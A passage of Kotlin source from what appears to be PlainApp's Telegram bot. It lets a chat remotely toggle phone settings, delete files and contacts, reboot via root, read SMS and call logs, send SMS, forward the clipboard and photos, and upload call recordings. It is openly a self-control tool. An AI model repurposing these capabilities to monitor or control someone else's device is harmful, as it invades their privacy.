                            PomodoroSettingsPreference.getValueAsync(MainApp.instance).workDuration * 60
                        } catch (_: Throwable) { 25 * 60 }
                        sendEvent(HttpApiEvents.PomodoroStartEvent(secs))
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_pause" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⏸ Paused")
                        sendEvent(HttpApiEvents.PomodoroPauseEvent())
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_stop" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⏹ Stopped")
                        sendEvent(HttpApiEvents.PomodoroStopEvent())
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    // ---- Torch / find phone / quick toggles ----
                    "torch_on" -> {
                        try { UtilitiesHelper.setTorch(true); TelegramApiClient.answerCallbackQuery(token, cqId, "🔦 ON") }
                        catch (e: Exception) { TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true) }
                        renderTorchState(editMessageId = messageId)
                    }
                    "torch_off" -> {
                        try { UtilitiesHelper.setTorch(false); TelegramApiClient.answerCallbackQuery(token, cqId, "🔦 OFF") }
                        catch (_: Exception) { TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true) }
                        renderTorchState(editMessageId = messageId)
                    }
                    "fp_on" -> {
                        LocateRingService.start()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🚨 Alarm started")
                        renderFindPhoneState(editMessageId = messageId)
                    }
                    "fp_off" -> {
                        LocateRingService.stop()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔕 Alarm stopped")
                        renderFindPhoneState(editMessageId = messageId)
                    }
                    "wifi_on" -> {
                        WifiControlHelper.setWifiEnabled(true, MainApp.instance)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📶 Enabling…")
                        kotlinx.coroutines.delay(800)
                        renderWifiState(editMessageId = messageId)
                    }
                    "wifi_off" -> {
                        WifiControlHelper.setWifiEnabled(false, MainApp.instance)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📶 Disabling…")
                        kotlinx.coroutines.delay(800)
                        renderWifiState(editMessageId = messageId)
                    }
                    "vol_set" -> {
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val stream = rest.substring(0, sep)
                        val pct = rest.substring(sep + 1).toIntOrNull() ?: 50
                        UtilitiesHelper.setVolume(stream, pct)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔊 $stream → $pct%")
                        renderVolumeState(editMessageId = messageId)
                    }
                    "br_set" -> {
                        val pct = rest.toIntOrNull() ?: 50
                        val ok = UtilitiesHelper.setBrightness(pct)
                        if (ok) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔆 $pct%")
                            renderBrightnessState(editMessageId = messageId)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Need WRITE_SETTINGS perm", true)
                        }
                    }
                    // ---- Bedtime ----
                    "bt_on" -> {
                        val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                        com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                            com.ismartcoding.plain.services.AppBlockHelper.Bedtime(true, cur.startMinutes, cur.endMinutes, cur.packages)
                        )
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🌙 Bedtime ON")
                        renderBedtimeState(editMessageId = messageId)
                    }
                    "bt_off" -> {
                        val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                        com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                            com.ismartcoding.plain.services.AppBlockHelper.Bedtime(false, cur.startMinutes, cur.endMinutes, cur.packages)
                        )
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🌙 Bedtime OFF")
                        renderBedtimeState(editMessageId = messageId)
                    }
                    "bt_w" -> {
                        // bt_w:<startMin>:<endMin>
                        val sep = rest.indexOf(':')
                        if (sep < 0) { TelegramApiClient.answerCallbackQuery(token, cqId, "Bad value", true); return@launch }
                        val sm = rest.substring(0, sep).toIntOrNull()
                        val em = rest.substring(sep + 1).toIntOrNull()
                        if (sm == null || em == null) { TelegramApiClient.answerCallbackQuery(token, cqId, "Bad value", true); return@launch }
                        val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                        com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                            com.ismartcoding.plain.services.AppBlockHelper.Bedtime(true, sm, em, cur.packages)
                        )
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🌙 ${fmtHm(sm)}–${fmtHm(em)}")
                        renderBedtimeState(editMessageId = messageId)
                    }
                    "bt_custom" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        pendingInput = "bedtime_set"
                        sendMessage("🌙 <b>Set bedtime window</b>\n\nReply with start and end in 24-hour format, e.g. <code>22:00 06:30</code>.\nSend <code>off</code> to disable.")
                    }
                    // ---- Launch history ----
                    "launches_clear" -> {
                        com.ismartcoding.plain.services.AppBlockHelper.clearHistory()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Cleared")
                        TelegramApiClient.editMessageText(token, chatId, messageId, "🗑 Launch history cleared.")
                    }
                    "launches_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdLaunches(emptyList())
                    }
                    // ---- Live call ----
                    "lc_accept" -> {
                        com.ismartcoding.plain.services.LiveCallTracker.acceptFromPanel()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "✅ Accepted")
                        renderLiveCallState(editMessageId = messageId)
                    }
                    "lc_end" -> {
                        com.ismartcoding.plain.services.LiveCallTracker.end()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔚 Ended")
                        renderLiveCallState(editMessageId = messageId)
                    }
                    "lc_mute" -> {
                        com.ismartcoding.plain.services.LiveCallTracker.setMuted(true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔇 Muted")
                        renderLiveCallState(editMessageId = messageId)
                    }
                    "lc_unmute" -> {
                        com.ismartcoding.plain.services.LiveCallTracker.setMuted(false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🎙 Live")
                        renderLiveCallState(editMessageId = messageId)
                    }
                    "lc_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderLiveCallState(editMessageId = messageId)
                    }
                    // ---- Launcher ----
                    "lpg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderLaunchAppsPage(q, off, editMessageId = messageId)
                    }
                    "lrun" -> {
                        val pkg = pkgFromToken(rest) ?: rest
                        val ok = AppLauncherHelper.launch(pkg)
                        if (ok) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🚀 Launched")
                            sendMessage("🚀 Launched <code>${htmlEsc(pkg)}</code> on the device.")
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "No launch intent", true)
                        }
                    }
                    // ---- Airplane mode ----
                    "air_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Enabling airplane mode…")
                        cmdAirplane(listOf("on"))
                    }
                    "air_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Disabling airplane mode…")
                        cmdAirplane(listOf("off"))
                    }
                    // ---- Mobile data ----
                    "mdata_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Enabling mobile data…")
                        cmdMobileData(listOf("on"))
                    }
                    "mdata_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Disabling mobile data…")
                        cmdMobileData(listOf("off"))
                    }
                    // ---- Photo forwarding ----
                    "photofwd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdForwardPhotos(listOf("on"))
                    }
                    "photofwd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdForwardPhotos(listOf("off"))
                    }
                    // ---- Clipboard forwarding ----
                    "clipfwd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdForwardClipboard(listOf("on"))
                    }
                    "clipfwd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdForwardClipboard(listOf("off"))
                    }
                    // ---- Bluetooth ----
                    "blue_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Enabling…")
                        BluetoothControlHelper.setEnabled(true)
                        kotlinx.coroutines.delay(1000)
                        renderBluetoothState(editMessageId = messageId)
                    }
                    "blue_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Disabling…")
                        BluetoothControlHelper.setEnabled(false)
                        kotlinx.coroutines.delay(1000)
                        renderBluetoothState(editMessageId = messageId)
                    }
                    "blue_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBluetoothState(editMessageId = messageId)
                    }
                    // ---- Clear cache picker ----
                    "cc_pick" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Clearing…")
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ Session expired. Send /clearcache again.")
                        } else {
                            val ok = clearAppCache(pkg)
                            val label = try { MainApp.instance.packageManager.getApplicationLabel(MainApp.instance.packageManager.getApplicationInfo(pkg, 0)).toString() } catch (_: Throwable) { pkg }
                            if (ok) sendMessage("✅ Cache cleared for <b>${htmlEsc(label)}</b>.")
                            else sendMessage("❌ Could not clear cache for <b>${htmlEsc(label)}</b>.\n<i>Device Admin may be required on some ROMs.</i>")
                        }
                    }
                    "cc_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send app name…")
                        pendingInput = "cc_search"
                        sendMessage("🔍 Send an app name to search (e.g. <code>chrome</code>), or <code>*</code> to list all.")
                    }
                    "cc_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        val q = if (sep < 0) "" else rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = if (sep < 0) rest.toIntOrNull() ?: 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderClearCachePage(q, off, editMessageId = messageId)
                    }
                    // ---- Geofence ----
                    "gf_list" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderGeofenceList(editMessageId = messageId)
                    }
                    "gf_events" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderGeofenceEvents(editMessageId = messageId)
                    }
                    "gf_add" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        pendingInput = "gf_new"
                        sendMessage("🗺 <b>Add geofence</b>\n\nSend in format:\n<code>Name, lat, lng, radius_m</code>\n\nExample:\n<code>Home, 28.6139, 77.2090, 200</code>\n\nSend any /command to cancel.")
                    }
                    "gf_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        GeofencingHelper.deleteFence(rest)
                        renderGeofenceList(editMessageId = messageId)
                    }
                    "gf_tog" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val fence = GeofencingHelper.listFences().firstOrNull { it.id == rest }
                        if (fence != null) {
                            val updated = fence.copy(enabled = !fence.enabled)
                            GeofencingHelper.saveFence(updated)
                            TelegramApiClient.answerCallbackQuery(token, cqId, if (updated.enabled) "🟢 Enabled" else "⚪ Disabled")
                        }
                        renderGeofenceList(editMessageId = messageId)
                    }
                    // ---- Note editing ----
                    "note_edit" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val n = NoteHelper.getById(rest)
                        if (n == null) {
                            sendMessage("❌ Note not found.")
                        } else {
                            pendingInput = "note_edit_save:$rest"
                            sendMessage("✏️ <b>Edit note: ${htmlEsc(n.title.ifBlank { "(untitled)" })}</b>\n\nSend the new content (first line = title, rest = body).\nCurrent content:\n<pre>${htmlEsc(n.content.take(1000))}</pre>\n\nSend any /command to cancel.")
                        }
                    }
                    // ---- Contact delete ----
                    "con_del_ok" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Deleting…")
                        try {
                            ContactMediaStoreHelper.deleteByIdsAsync(MainApp.instance, setOf(rest))
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "✅ Contact deleted.")
                        } catch (e: Exception) {
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "❌ Could not delete contact: ${htmlEsc(e.message ?: "")}")
                        }
                    }
                    "con_del_no" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Deletion cancelled.")
                    }
                    // ---- Contact groups ----
                    "cg_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading members…")
                        renderContactGroupMembers(rest, editMessageId = messageId)
                    }
                    "cg_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdContactGroups()
                    }
                    // ---- Delete file ----
                    "df_yes" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Deleting…")
                        val path = pathFromToken(rest)
                        if (path == null) {
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "❌ Invalid path token.")
                        } else {
                            val f = File(path)
                            val deleted = f.exists() && (if (f.isDirectory) f.deleteRecursively() else f.delete())
                            val msg = if (deleted) "✅ Deleted: <code>${htmlEsc(f.name)}</code>" else "❌ Could not delete <code>${htmlEsc(f.name)}</code>. Check permissions."
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, msg)
                            else sendMessage(msg)
                        }
                    }
                    "df_no" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Delete cancelled.")
                    }
                    // ---- Docs ----
                    "doc_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending document…")
                        val path = pathFromToken(rest)
                        if (path == null) { sendMessage("❌ Invalid token.") } else {
                            val f = File(path)
                            if (!f.exists()) { sendMessage("❌ File not found.") }
                            else if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large (${humanSize(f.length())}).") }
                            else { sendUploadDocument(); TelegramApiClient.sendDocument(token, chatId, f, "📄 ${htmlEsc(f.name)}") }
                        }
                    }
                    "doc_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        val q = if (sep < 0) "" else rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = if (sep < 0) rest.toIntOrNull() ?: 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderDocsPage(q, off, editMessageId = messageId)
                    }
                    // ---- Reboot ----
                    "reboot_yes" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Rebooting…")
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔄 Rebooting via root…")
                        try {
                            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
                            p.waitFor()
                        } catch (e: Exception) {
                            sendMessage("❌ Reboot failed: ${htmlEsc(e.message ?: "")}")
                        }
                    }
                    "reboot_adm" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Rebooting…")
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔄 Rebooting via Device Admin…")
                        try {
                            val ctx = MainApp.instance
                            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                            val admin = android.content.ComponentName(ctx, com.ismartcoding.plain.receivers.PlainDeviceAdminReceiver::class.java)
                            val m = dpm.javaClass.getMethod("reboot", android.content.ComponentName::class.java)
                            m.invoke(dpm, admin)
                        } catch (e: Exception) {
                            sendMessage("❌ Reboot failed: ${htmlEsc(e.message ?: "")}")
                        }
                    }
                    "reboot_no" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Reboot cancelled.")
                    }
                    // ---- MMS paging ----
                    "mms_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
                        renderMmsPage(off, editMessageId = messageId)
                    }
                    else -> TelegramApiClient.answerCallbackQuery(token, cqId)
                }
            } catch (e: Exception) {
                LogCat.e("TelegramBot callback error: ${e.message}")
                TelegramApiClient.answerCallbackQuery(token, cqId, "Error: ${e.message?.take(100)}", true)
            }
        }
    }

    private suspend fun cbSendRecording(filename: String) {
        try {
            val safe = filename.substringAfterLast('/').substringAfterLast('\\')
            val file = java.io.File(CallRecorderHelper.recordingsDir(MainApp.instance), safe)
            if (!file.exists() || !file.isFile) {
                sendMessage("❌ Recording not found: <code>${htmlEsc(safe)}</code>")
                return
            }
            sendUploadDocument()
            val meta = CallRecorderHelper.list().firstOrNull { it.filename == safe }
            val durSec = ((meta?.durationMs ?: 0L) / 1000).toInt().coerceAtLeast(1)
            val name = meta?.displayName?.ifBlank { meta.source } ?: safe
            val caption = "🎙 ${htmlEsc(name)} · ${formatDuration(meta?.durationMs ?: 0L)} · ${file.length() / 1024} KB"
            val ok = TelegramApiClient.sendAudio(token, chatId, file, caption, durSec)
            if (!ok) {
                // Audio send failed (Telegram is picky about codecs); fall back to document.
                TelegramApiClient.sendDocument(token, chatId, file, caption)
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not send recording: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun registerCommands() {
        TelegramApiClient.setMyCommands(token, allCommands.map { it.first to it.second.replace(Regex("<[^>]+>"), "") })
    }

    private fun sendTyping() = TelegramApiClient.sendChatAction(token, chatId, "typing")
    private fun sendUploadPhoto() = TelegramApiClient.sendChatAction(token, chatId, "upload_photo")
    private fun sendUploadDocument() = TelegramApiClient.sendChatAction(token, chatId, "upload_document")
    private fun sendRecordVoice() = TelegramApiClient.sendChatAction(token, chatId, "record_voice")
    private fun sendUploadVideo() = TelegramApiClient.sendChatAction(token, chatId, "upload_video")

    private suspend fun cmdStart() {
        sendTyping()
        val info = buildString {
            append("🤖 <b>PlainApp Bot</b> — device remote control\n\n")
            append("📱 <b>Device:</b> ${htmlEsc(PhoneHelper.getDeviceName(MainApp.instance))}\n")
            append("🤖 <b>Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
            append("🕐 <b>Time:</b> ${ts}\n\n")
            val bat = BatteryHistoryHelper.sampleNow(MainApp.instance)
            if (bat != null) {
                append("🔋 <b>Battery:</b> ${bat.level}% ${if (bat.plugged > 0) "⚡ charging" else ""}\n")
            }
            val call = LiveCallTracker.snapshot()
            if (call.state != "idle") {
                append("📞 <b>Call:</b> ${call.state} (${call.direction})\n")
            }
            append("\nSend /help to see all available commands.")
        }
        sendMessage(info)
    }

    private suspend fun cmdHelp() {
        sendTyping()
        val sb = StringBuilder("📖 <b>PlainApp Bot — All Commands</b>\n\n")
        allCommands.forEach { (cmd, desc) ->
            sb.append("/<code>$cmd</code> — $desc\n")
        }
        sb.append("\n💡 <i>Live alerts are auto-forwarded for calls, SMS & notifications.</i>")
        sendMessage(sb.toString())
    }

    private suspend fun cmdMessages(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty() && args.firstOrNull()?.toIntOrNull() == null) args.joinToString(" ").trim() else ""
        lastMessagesQuery = query
        renderMessagesPage(query, editMessageId = null)
    }

    private suspend fun renderMessagesPage(query: String, editMessageId: Long?) {
        lastMessagesQuery = query
        try {
            val limit = 20
            val convs = SmsConversationHelper.searchConversationsAsync(MainApp.instance, query, limit, 0)
            val title = if (query.isEmpty()) "💬 <b>SMS Conversations</b>" else "💬 <b>SMS Conversations</b> · <i>${htmlEsc(query)}</i>"
            if (convs.isEmpty()) {
                val msg = "$title\n\nNo conversations found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("$title (${convs.size})\n<i>Tap a conversation to open the thread.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            convs.forEachIndexed { i, c ->
                val addr = c.address.ifBlank { "Thread ${c.id}" }
                sb.append("${i + 1}. 📱 <b>${htmlEsc(addr)}</b>")
                if (!c.read) sb.append("  🔴")
                sb.append("\n   💬 ${htmlEsc(c.snippet.take(80))}\n")
                sb.append("   🕐 ${fmtTime(c.date.toEpochMilliseconds())}  ·  📬 ${c.messageCount} msgs\n\n")
                val label = "${i + 1}. ${addr.take(20)}"
                rows.add(listOf(label to "sms_open:${c.id}"))
            }
            rows.add(listOf("🔍 Search messages" to "messages_q", "🔄 Refresh" to "messages_refresh"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read SMS: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private suspend fun cmdSmsThread(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /sms &lt;thread_id&gt;\n\nUse /messages to list conversations and tap one to open."); return }
        sendTyping()
        val threadId = args[0].trim().filter { it.isDigit() }
        if (threadId.isEmpty()) { sendMessage("❌ Invalid thread id: <code>${htmlEsc(args[0])}</code>"); return }
        renderSmsThreadPage(threadId, offset = 0, editMessageId = null)
    }

    private suspend fun renderSmsThreadPage(threadId: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            // Slice client-side so paging is reliable even when the SMS provider
            // refuses LIMIT/OFFSET in the sort clause on Android 11+.
            val fetchCap = offset + pageSize + 1
            val all = SmsHelper.searchAsync(MainApp.instance, "thread_id:$threadId", fetchCap, 0)
            val window = all.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📭 No messages in thread $threadId" else "📭 No more messages."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📨 <b>Thread $threadId</b> · Showing ${offset + 1}–${offset + pageItems.size}\n\n")
            // Show oldest-first within the page so threading reads naturally.
            pageItems.reversed().forEach { m ->
                val dir = if (m.type == 1) "📥" else "📤"
                sb.append("$dir <b>${htmlEsc(m.address.ifBlank { "(unknown)" })}</b>  <i>${fmtTime(m.date.toEpochMilliseconds())}</i>\n")
                sb.append("   ${htmlEsc(m.body.take(300))}\n\n")
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "sms_pg:$threadId:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "sms_pg:$threadId:${offset + pageSize}")
            val markup = if (nav.isNotEmpty()) TelegramApiClient.inlineKeyboard(listOf(nav)) else null
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read thread: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun cmdSendSms(args: List<String>) {
        if (args.size < 2) { sendMessage("Usage: /sendsms <number> <message text>"); return }
        val number = args[0]
        val text = args.drop(1).joinToString(" ")
        try {
            SmsHelper.sendText(number, text)
            sendMessage("✅ SMS sent to <code>${htmlEsc(number)}</code>:\n<i>${htmlEsc(text)}</i>")
        } catch (e: Exception) {
            sendMessage("❌ Failed to send SMS: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdCalls(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty() && args.firstOrNull()?.toIntOrNull() == null) args.joinToString(" ").trim() else ""
        lastCallsQuery = query
        renderCallsPage(query, offset = 0, editMessageId = null)
    }

    private suspend fun renderCallsPage(query: String, offset: Int, editMessageId: Long?) {
        lastCallsQuery = query
        try {
            val pageSize = 10
            // CallLog provider ignores QUERY_ARG_OFFSET on most devices, so the same
            // first page would otherwise repeat. Slice client-side for reliable paging.
            val fetchCap = offset + pageSize + 1
            val all = CallMediaStoreHelper.searchAsync(MainApp.instance, query, fetchCap, 0)
            val window = all.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📞 No call log entries." else "📞 No more entries."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val queryLabel = if (query.isNotEmpty()) " · search: <i>${htmlEsc(query)}</i>" else ""
            val sb = StringBuilder("📞 <b>Recent Calls</b>$queryLabel · Showing ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("<i>Tap a number's row below to call, text, or save it.</i>\n\n")

            // Track which numbers we've already issued a button row for, so a number
            // that appears multiple times in the page doesn't duplicate buttons.
            // Map number -> the index in the visible list (1-based) so the button
            // label can reference the call entry the user is acting on.
            val seenNumbers = LinkedHashMap<String, Pair<Int, Boolean>>() // num -> (index, knownContact)

            pageItems.forEachIndexed { i, c ->
                val typeEmoji = when (c.type) {
                    CallLog.Calls.INCOMING_TYPE -> "📲 Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "📤 Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "❌ Missed"
                    CallLog.Calls.REJECTED_TYPE -> "🚫 Rejected"
                    else -> "📞 Unknown"
                }
                val dur = if (c.duration > 0) " · ${c.duration}s" else ""
                // Resolve name: use cached name from CallLog, fall back to live ContactsContract lookup
                val resolvedName = c.name.ifBlank { lookupContactName(c.number) }
                val rowIndex = offset + i + 1
                sb.append("${rowIndex}. $typeEmoji${dur}\n")
                if (resolvedName.isNotBlank()) {
                    sb.append("   👤 <b>${htmlEsc(resolvedName)}</b>\n")
                }
                sb.append("   📱 <code>${htmlEsc(c.number)}</code>\n")
                sb.append("   🕐 ${fmtTime(c.startedAt.toEpochMilliseconds())}\n\n")

                if (c.number.isNotBlank() && !seenNumbers.containsKey(c.number)) {
                    seenNumbers[c.number] = rowIndex to resolvedName.isNotBlank()
                }
            }

            val rows = mutableListOf<List<Pair<String, String>>>()

            // One Call / SMS / (Save|Open) row per unique number on the page.
            // Cap at 8 to keep the inline keyboard usable on phones.
            seenNumbers.entries.take(8).forEach { (num, meta) ->
                val (rowIndex, isKnown) = meta
                val tok = phoneToken(num)
                val short = num.take(16)
                val thirdLabel = if (isKnown) "👤 Open" else "💾 Save"
                val thirdData = if (isKnown) "cl_open:$tok" else "nf_save:$tok"
                rows.add(listOf(
                    "${rowIndex}. 📞 $short" to "nf_call:$tok",
                    "💬 SMS" to "nf_sms:$tok",
                    thirdLabel to thirdData,
                ))
            }

            val q = if (query.isEmpty()) "_" else query
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "calls_pg:$q:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "calls_pg:$q:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search calls" to "calls_q", "🔄 Refresh" to "calls_pg:_:0"))

            val markup = if (rows.isNotEmpty()) TelegramApiClient.inlineKeyboard(rows) else null
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read call log: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    @Volatile private var lastRecQuery: String = ""

    private suspend fun cmdRecordings(args: List<String>) {
        sendTyping()
        val query = args.joinToString(" ").trim()
        renderRecordingsPage(query, 0, editMessageId = null)
    }

    private suspend fun renderRecordingsPage(query: String, offset: Int, editMessageId: Long?) {
        lastRecQuery = query
        try {
            val all = CallRecorderHelper.list()
            // Filter by query: match against displayName (phone number), source app, or resolved contact name
            val filtered = if (query.isEmpty()) all else {
                val q = query.lowercase()
                all.filter { m ->
                    m.displayName.lowercase().contains(q) ||
                    m.source.lowercase().contains(q) ||
                    lookupContactName(m.displayName).lowercase().contains(q)
                }
            }
            if (filtered.isEmpty()) {
                val msg = if (query.isEmpty()) "🎙️ No call recordings found. Enable call recording in PlainApp settings."
                          else "🎙️ No recordings match \"${htmlEsc(query)}\"."
                val rows = mutableListOf<List<Pair<String, String>>>()
                rows.add(listOf("🔍 Search" to "rec_q", "🔄 Refresh" to "rec_pg:_:0"))
                val markup = TelegramApiClient.inlineKeyboard(rows)
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
                else sendMessage(msg, replyMarkup = markup)
                return
            }
            val pageSize = 8
            val window = filtered.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            val queryLabel = if (query.isNotEmpty()) " · 🔍 <i>${htmlEsc(query)}</i>" else ""
            val sb = StringBuilder("🎙️ <b>Call Recordings</b>$queryLabel\n")
            sb.append("Showing ${offset + 1}–${offset + pageItems.size} of ${filtered.size}\n")
            sb.append("<i>Tap a button below to download that recording.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, m ->
                val dirEmoji = if (m.direction == "incoming") "📲" else "📞"
                val dur = formatDuration(m.durationMs)
